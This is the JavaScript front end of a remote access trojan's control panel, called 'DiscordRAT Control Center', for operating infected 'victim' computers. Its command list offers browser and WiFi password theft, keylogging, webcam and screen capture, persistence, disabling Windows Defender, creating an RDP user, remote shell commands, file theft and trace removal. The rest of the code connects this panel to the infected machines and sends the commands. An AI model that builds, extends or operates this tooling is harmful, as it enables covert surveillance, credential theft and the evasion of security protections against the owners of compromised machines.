// ============================================
// DiscordRAT Control Center - Web Interface
// ============================================

let selectedClient = null;
let socket = null;
let clients = {};
let currentPath = '';

// ============================================
// COMMANDS DATA
// ============================================

const COMMANDS = {
    'File Management': [
        { name: 'pwd', desc: 'Show current directory' },
        { name: 'ls', desc: 'List files in current directory' },
        { name: 'cd', desc: 'Change directory' },
        { name: 'mkdir', desc: 'Create a new folder' },
        { name: 'delete', desc: 'Delete a file or folder' },
        { name: 'rename', desc: 'Rename a file or folder' },
        { name: 'copy', desc: 'Copy a file or folder' },
        { name: 'move', desc: 'Move a file or folder' },
        { name: 'download', desc: 'Download a file from victim' },
    ],
    'System': [
        { name: 'info', desc: 'Get full system information' },
        { name: 'shell', desc: 'Execute a shell command' },
        { name: 'ps', desc: 'List running processes' },
        { name: 'kill', desc: 'Kill a process by PID' },
        { name: 'ping', desc: 'Check if RAT is responding' },
        { name: 'uptime', desc: 'Show system uptime' },
        { name: 'hostname', desc: 'Show computer name' },
        { name: 'ip', desc: 'Show IP addresses' },
        { name: 'whoami', desc: 'Show current username' },
        { name: 'persist', desc: 'Install persistence' },
    ],
    'Capture': [
        { name: 'screenshot', desc: 'Take screenshot of all monitors' },
        { name: 'webcam', desc: 'Take webcam photo' },
        { name: 'keylogs', desc: 'Get keylogger logs' },
        { name: 'clipboard', desc: 'Get clipboard contents' },
    ],
    'Stealer': [
        { name: 'passwords', desc: 'Steal browser passwords' },
        { name: 'wifi', desc: 'Get saved WiFi passwords' },
        { name: 'history', desc: 'Get browser history' },
    ],
    'Network': [
        { name: 'netstat', desc: 'Show network connections' },
        { name: 'arp', desc: 'Show ARP table' },
        { name: 'nslookup', desc: 'DNS lookup' },
        { name: 'pinghost', desc: 'Ping a host' },
    ],
    'Fun': [
        { name: 'beep', desc: 'Make the PC beep' },
        { name: 'volume', desc: 'Set system volume (0-100)' },
        { name: 'screenbrightness', desc: 'Set screen brightness (0-100)' },
        { name: 'openurl', desc: 'Open a URL in browser' },
        { name: 'wallpaper', desc: 'Change wallpaper to an image' },
        { name: 'speak', desc: 'Make the PC speak text' },
    ],
    'System Control': [
        { name: 'rdp', desc: 'Enable RDP and create user' },
        { name: 'lock', desc: 'Lock the workstation' },
        { name: 'restart', desc: 'Restart the computer' },
        { name: 'shutdown', desc: 'Shutdown the computer' },
        { name: 'logout', desc: 'Logout current user' },
        { name: 'sleep', desc: 'Put system to sleep' },
        { name: 'hibernate', desc: 'Hibernate system' },
    ],
    'Defender': [
        { name: 'disabledefender', desc: 'Disable Windows Defender' },
        { name: 'enabledefender', desc: 'Enable Windows Defender' },
        { name: 'adddefenderexclusion', desc: 'Add file to Defender exclusions' },
    ],
    'Dangerous': [
        { name: 'selfdestruct', desc: '⚠️ Remove RAT and all traces' },
    ],
};

// ============================================
// SOCKET.IO CONNECTION
// ============================================

function connectSocket() {
    socket = io();
    
    socket.on('connect', function() {
        console.log('🔌 WebSocket connected');
        document.getElementById('botStatus').textContent = 'Connected';
        document.getElementById('statusDot').className = 'dot online';
    });
    
    socket.on('disconnect', function() {
        console.log('🔌 WebSocket disconnected');
        document.getElementById('botStatus').textContent = 'Disconnected';
        document.getElementById('statusDot').className = 'dot offline';
    });
    
    socket.on('clients_update', function(data) {
        console.log('📡 Clients update:', data);
        clients = data.clients || {};
        updateClientLists();
        if (selectedClient && clients[selectedClient]) {
            updateImages(selectedClient);
        }
    });
    
    socket.on('client_connected', function(client) {
        console.log('🖥️ New client connected:', client);
        if (client && client.client_id) {
            clients[client.client_id] = client;
            updateClientLists();
        }
    });
    
    socket.on('client_update', function(data) {
        console.log('🔄 Client update:', data);
        if (data.client_id && clients[data.client_id]) {
            clients[data.client_id].status = data.status || clients[data.client_id].status;
            updateClientLists();
        }
    });
    
    socket.on('command_result', function(data) {
        console.log('📤 Command result:', data);
        addTerminalOutput(`📤 ${data.result}`, 'success');
        if (data.client_id === selectedClient) {
            const activeSection = document.querySelector('.content-section.active');
            if (activeSection && activeSection.id === 'section-files') {
                if (data.result && data.result.length > 0) {
                    const lines = data.result.split('\n');
                    const hasFiles = lines.some(line => 
                        line.includes('bytes') || 
                        line.includes('/') || 
                        line.includes('(') || 
                        line.includes(')') ||
                        line.includes('.') ||
                        line.trim().match(/^[^\s]+\s+[\d.]+\s+bytes$/)
                    );
                    if (hasFiles || lines.length > 1) {
                        parseFileList(data.result);
                    }
                }
            }
        }
    });
    
    socket.on('command_error', function(data) {
        console.log('❌ Command error:', data);
        addTerminalOutput(`❌ Error: ${data.error}`, 'error');
    });
    
    socket.on('image_update', function(data) {
        console.log('📸 Image update:', data);
        if (data.client_id && data.image) {
            if (!clients[data.client_id]) {
                clients[data.client_id] = { images: [] };
            }
            if (!clients[data.client_id].images) {
                clients[data.client_id].images = [];
            }
            clients[data.client_id].images.push(data.image);
            if (data.client_id === selectedClient) {
                updateImages(selectedClient);
            }
        }
    });
    
    socket.on('images_cleared', function(data) {
        console.log('🗑️ Images cleared:', data);
        if (data.client_id === selectedClient && clients[selectedClient]) {
            clients[selectedClient].images = [];
            updateImages(selectedClient);
        }
        addTerminalOutput(`🗑️ Images cleared for ${data.client_id}`, 'success');
    });
}

// ============================================
// CLIENT MANAGEMENT
// ============================================

function updateClientLists() {
    const clientList = document.getElementById('clientList');
    const allClientsList = document.getElementById('allClientsList');
    const clientCount = document.getElementById('clientCount');
    const statClients = document.getElementById('statClients');
    
    const clientArray = Object.values(clients);
    const count = clientArray.length;
    
    clientCount.textContent = count;
    statClients.textContent = count;
    
    if (count === 0) {
        const emptyHtml = '<div class="empty-state"><i class="fas fa-users"></i>No clients connected</div>';
        clientList.innerHTML = emptyHtml;
        allClientsList.innerHTML = emptyHtml;
        return;
    }
    
    let html = '';
    for (const client of clientArray) {
        const statusClass = client.status === 'online' ? 'online' : 'offline';
        const isSelected = client.client_id === selectedClient;
        html += `
            <div class="client-item ${isSelected ? 'selected' : ''}" onclick="selectClient('${client.client_id}')">
                <div class="client-info">
                    <div class="client-name">
                        <span class="status-dot ${statusClass}"></span>
                        <strong>${client.hostname || 'Unknown'}</strong>
                        <span style="font-size:11px; color:var(--text-muted);">${client.client_id}</span>
                    </div>
                    <div class="client-details">
                        <span><i class="fas fa-network-wired"></i> ${client.ip || 'Unknown'}</span>
                        <span><i class="fas fa-desktop"></i> ${client.os || 'Unknown'}</span>
                        <span><i class="fas fa-user"></i> ${client.username || 'Unknown'}</span>
                        <span><i class="fas fa-clock"></i> ${new Date(client.connected_at).toLocaleTimeString()}</span>
                    </div>
                </div>
                <div class="client-actions">
                    <button class="btn btn-sm ${isSelected ? 'btn-primary' : 'btn-outline'}" onclick="event.stopPropagation(); selectClient('${client.client_id}')">
                        ${isSelected ? '✅ Selected' : 'Select'}
                    </button>
                </div>
            </div>
        `;
    }
    clientList.innerHTML = html;
    allClientsList.innerHTML = html;
}

function selectClient(clientId) {
    selectedClient = clientId;
    const client = clients[clientId];
    
    if (client) {
        const displayText = `🖥️ ${client.hostname} (${clientId})`;
        document.querySelectorAll('.selected-client').forEach(el => el.textContent = displayText);
        updateImages(clientId);
        const activeSection = document.querySelector('.content-section.active');
        if (activeSection && activeSection.id === 'section-files') {
            setTimeout(() => loadFiles(), 300);
        }
    }
    
    updateClientLists();
    addTerminalOutput(`✅ Selected client: ${clientId}`, 'success');
}

function refreshClients() {
    if (socket) {
        socket.emit('get_clients');
    }
    addTerminalOutput('🔄 Refreshing clients...', 'info');
}

// ============================================
// COMMANDS PAGE
// ============================================

function renderCommands() {
    const container = document.getElementById('commandsContainer');
    if (!container) return;
    
    let html = '';
    for (const [category, commands] of Object.entries(COMMANDS)) {
        html += `
            <div class="command-grid-category">
                <h4><i class="fas fa-tag"></i> ${category}</h4>
                <div class="command-grid-items">
        `;
        for (const cmd of commands) {
            const isDangerous = category === 'Dangerous';
            const btnColor = isDangerous ? 'background: #dc2626; color: white;' : '';
            html += `
                <div class="command-item">
                    <span class="cmd-name">${cmd.name}</span>
                    <span class="cmd-desc">${cmd.desc}</span>
                    <button class="cmd-run" style="${btnColor}" onclick="runQuickCommand('${cmd.name}')">
                        <i class="fas fa-play"></i> Run
                    </button>
                </div>
            `;
        }
        html += `
                </div>
            </div>
        `;
    }
    container.innerHTML = html;
}

// ============================================
// FILE BROWSER
// ============================================

function loadFiles() {
    if (!selectedClient) {
        document.getElementById('fileList').innerHTML = '<div class="empty-state">Select a client to browse files</div>';
        return;
    }
    runFileCommand('pwd');
    setTimeout(() => runFileCommand('ls'), 300);
}

function runFileCommand(command) {
    if (!selectedClient) {
        addTerminalOutput('❌ No client selected', 'error');
        return;
    }
    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient, command: command })
    }).catch(error => addTerminalOutput(`❌ Error: ${error.message}`, 'error'));
}

function parseFileList(output) {
    const container = document.getElementById('fileList');
    if (!container) return;
    
    const lines = output.split('\n');
    let files = [];
    
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        if (trimmed.startsWith('Type:') || trimmed.startsWith('Name:') || trimmed.startsWith('Size:')) continue;
        if (trimmed.includes('---')) continue;
        if (trimmed.includes('Directory:')) continue;
        if (trimmed.includes('Items:')) continue;
        if (trimmed === 'Empty directory') {
            container.innerHTML = '<div class="empty-state">📂 Directory is empty</div>';
            return;
        }
        
        const isDir = trimmed.endsWith('/');
        let name = trimmed;
        let details = '';
        
        if (isDir) {
            name = trimmed.replace('/', '').trim();
            details = '📁 Folder';
        } else if (trimmed.includes('(') && trimmed.includes(')')) {
            const match = trimmed.match(/^(.+?)\s*\((.+?)\)$/);
            if (match) {
                name = match[1].trim();
                details = match[2].trim();
            }
        } else if (trimmed.includes('bytes')) {
            const match = trimmed.match(/^(.+?)\s*\((.+?)\s*bytes\)$/);
            if (match) {
                name = match[1].trim();
                const size = parseInt(match[2]);
                if (size > 1024 * 1024) {
                    details = (size / (1024 * 1024)).toFixed(2) + ' MB';
                } else if (size > 1024) {
                    details = (size / 1024).toFixed(2) + ' KB';
                } else {
                    details = size + ' B';
                }
            }
        } else {
            const parts = trimmed.split(/\s{2,}/);
            if (parts.length > 1) {
                name = parts[0];
                details = parts[1] || '';
            }
        }
        
        if (!name || name === '') continue;
        if (isDir && !details) details = '📁 Folder';
        
        files.push({ name, isDir, details: details || '' });
    }
    
    if (files.length === 0) {
        container.innerHTML = '<div class="empty-state">📂 No files found</div>';
        return;
    }
    
    renderFileList(files);
}

function renderFileList(files) {
    const container = document.getElementById('fileList');
    if (!container) return;
    
    files.sort((a, b) => {
        if (a.isDir && !b.isDir) return -1;
        if (!a.isDir && b.isDir) return 1;
        return a.name.localeCompare(b.name);
    });
    
    let html = `
        <div style="display:grid; grid-template-columns: 1fr auto auto; gap:8px; padding:8px 12px; background:var(--surface-light); border-radius:6px; margin-bottom:8px; font-size:12px; color:var(--text-muted); font-weight:600;">
            <span>Name</span>
            <span>Size</span>
            <span style="text-align:right;">Actions</span>
        </div>
    `;
    
    for (const file of files) {
        const icon = file.isDir ? 'fa-folder' : 'fa-file';
        const iconColor = file.isDir ? '#fbbf24' : '#60a5fa';
        const name = file.name || 'Unknown';
        const details = file.details || (file.isDir ? '📁' : '');
        const escapedName = name.replace(/'/g, "\\'").replace(/"/g, '\\"');
        
        html += `
            <div class="file-item" ${file.isDir ? `onclick="runFileCommand('cd \"${escapedName}\"')"` : ''}>
                <div class="file-name">
                    <i class="fas ${icon}" style="color:${iconColor};"></i>
                    <span>${name}</span>
                </div>
                <div class="file-size">${file.isDir ? '—' : details}</div>
                <div class="file-actions">
                    ${file.isDir ? 
                        `<button class="btn-open" onclick="event.stopPropagation(); runFileCommand('cd \"${escapedName}\"')"><i class="fas fa-folder-open"></i> Open</button>` :
                        `<button class="btn-download" onclick="event.stopPropagation(); runFileCommand('download \"${escapedName}\"')"><i class="fas fa-download"></i></button>`
                    }
                    <button class="btn-delete" onclick="event.stopPropagation(); if(confirm('Delete "${name}"?')) runFileCommand('delete \"${escapedName}\"')">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
            </div>
        `;
    }
    
    container.innerHTML = html;
}

function createFolder() {
    if (!selectedClient) {
        addTerminalOutput('❌ No client selected', 'error');
        return;
    }
    const name = prompt('Enter folder name:');
    if (name) {
        runFileCommand(`mkdir "${name}"`);
        setTimeout(() => runFileCommand('ls'), 500);
    }
}

// ============================================
// IMAGE HANDLING
// ============================================

function updateImages(clientId) {
    const gallery = document.getElementById('imagesGallery');
    if (!gallery) return;
    
    const client = clients[clientId];
    if (!client || !client.images || client.images.length === 0) {
        gallery.innerHTML = `
            <div class="empty-state" style="grid-column:1/-1;">
                <i class="fas fa-images" style="font-size:32px; display:block; margin-bottom:8px; opacity:0.5;"></i>
                No images captured yet
            </div>
        `;
        return;
    }
    
    let html = '';
    const images = client.images.slice().reverse();
    for (const img of images) {
        html += `
            <div class="image-item">
                <img src="${img.url}" alt="${img.filename}" onclick="window.open('${img.url}','_blank')" loading="lazy">
                <div class="image-info">
                    <div class="filename" title="${img.filename}">${img.filename}</div>
                    <div>${new Date(img.timestamp).toLocaleString()}</div>
                </div>
            </div>
        `;
    }
    gallery.innerHTML = html;
}

function clearImages() {
    if (!selectedClient) {
        addTerminalOutput('❌ No client selected', 'error');
        return;
    }
    if (!confirm(`Clear all images for ${selectedClient}?`)) return;
    
    fetch(`/api/client/${selectedClient}/clear_images`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    })
    .then(res => res.json())
    .then(result => {
        if (result.success) {
            addTerminalOutput(`🗑️ Images cleared for ${selectedClient}`, 'success');
            if (clients[selectedClient]) {
                clients[selectedClient].images = [];
                updateImages(selectedClient);
            }
        } else {
            addTerminalOutput(`❌ Failed to clear images: ${result.error}`, 'error');
        }
    })
    .catch(error => addTerminalOutput(`❌ Error: ${error.message}`, 'error'));
}

// ============================================
// TERMINAL
// ============================================

function addTerminalOutput(message, type = 'info') {
    const output = document.getElementById('terminalOutput');
    if (!output) return;
    
    const placeholder = output.querySelector('.empty-state');
    if (placeholder) placeholder.remove();
    
    const entry = document.createElement('div');
    entry.className = `terminal-entry terminal-${type}`;
    entry.textContent = message;
    output.appendChild(entry);
    output.scrollTop = output.scrollHeight;
    
    while (output.children.length > 100) {
        output.removeChild(output.firstChild);
    }
}

function runTerminalCommand() {
    if (!selectedClient) {
        addTerminalOutput('❌ No client selected. Click a client first.', 'error');
        return;
    }
    const input = document.getElementById('commandInput');
    const command = input.value.trim();
    if (!command) return;
    input.value = '';
    addTerminalOutput(`▶ ${command}`, 'info');
    sendCommand(selectedClient, command);
}

function runQuickCommand(command) {
    if (!selectedClient) {
        addTerminalOutput('❌ No client selected. Click a client first.', 'error');
        return;
    }
    addTerminalOutput(`▶ ${command}`, 'info');
    sendCommand(selectedClient, command);
}

function sendCommand(clientId, command) {
    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: clientId, command: command })
    })
    .then(res => res.json())
    .then(result => {
        if (result.error) {
            addTerminalOutput(`❌ Error: ${result.error}`, 'error');
        } else if (result.status === 'sent') {
            addTerminalOutput(`✅ Command sent successfully`, 'success');
        }
    })
    .catch(error => addTerminalOutput(`❌ Error: ${error.message}`, 'error'));
}

// ============================================
// NAVIGATION
// ============================================

document.addEventListener('DOMContentLoaded', function() {
    connectSocket();
    renderCommands();
    
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            const section = this.dataset.section;
            
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            this.classList.add('active');
            
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            const target = document.getElementById(`section-${section}`);
            if (target) {
                target.classList.add('active');
                document.getElementById('sectionTitle').textContent = this.querySelector('span')?.textContent || section;
            }
            
            if (section === 'capture' && selectedClient) {
                updateImages(selectedClient);
            }
            if (section === 'files' && selectedClient) {
                setTimeout(() => loadFiles(), 300);
            }
        });
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'Enter') {
            const input = document.getElementById('commandInput');
            if (input && document.activeElement === input) {
                runTerminalCommand();
            }
        }
    });
});